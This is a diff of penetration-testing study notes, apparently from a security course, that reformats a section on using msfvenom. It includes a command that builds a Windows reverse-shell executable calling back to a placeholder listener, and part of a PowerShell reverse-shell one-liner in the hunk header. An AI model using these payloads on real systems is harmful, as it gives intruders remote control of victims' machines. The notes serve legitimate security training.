@@ -383,20 +383,23 @@ powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);
 * [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) is a repository containing a wide range of shell codes in many different languages. 
 
 ## Msfvenom
-* Msfvenom: the one-stop-shop for all things payload related.
-* Part of the Metasploit framework, msfvenom is used to generate code for primarily reverse and bind shells.
-* It can be used to generate payloads in various formats (e.g. .exe, .aspx, .war, .py).
-* The standard syntax for msfvenom is: msfvenom -p <PAYLOAD> <OPTIONS>
-* For example, to generate a Windows x64 Reverse Shell in an exe format, we could use: msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
-* Here we are using a payload and four options:
-* -f <format>
-* Specifies the output format. In this case that is an executable (exe)
-* -o <file>
-* The output location and filename for the generated payload.
-* LHOST=<IP>
-* Specifies the IP to connect back to.
-* LPORT=<port>
-* The port on the local machine to connect back to. This can be anything between 0 and 65535 that isn't already in use; however, ports below 1024 are restricted and require a listener running with root privileges.
+* Part of the Metasploit framework.
+* Used to generate code for primarily reverse and bind shells.
+* Can be used to generate payloads in various formats.
+  * .exe, .aspx, .war, .py.
+```
+msfvenom -p <PAYLOAD> <OPTIONS>
+```
+* Generate Windows x64 Reverse Shell in an exe format.
+```
+msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
+```
+* `-f <format>` specifies the output format.
+* `-o <file>` specifies output location and filename for the generated payload.
+* `LHOST=<IP>` specifies IP to connect back to.
+* `LPORT=<port>`specifies port on the local machine to connect back to.
+  * This can be anything between 0 and 65535 that is not already in use.
+  * Ports below 1024 are restricted and require a listener running with `root` privileges.
 
 ## Staged vs Stageless Payloads
 ### Staged
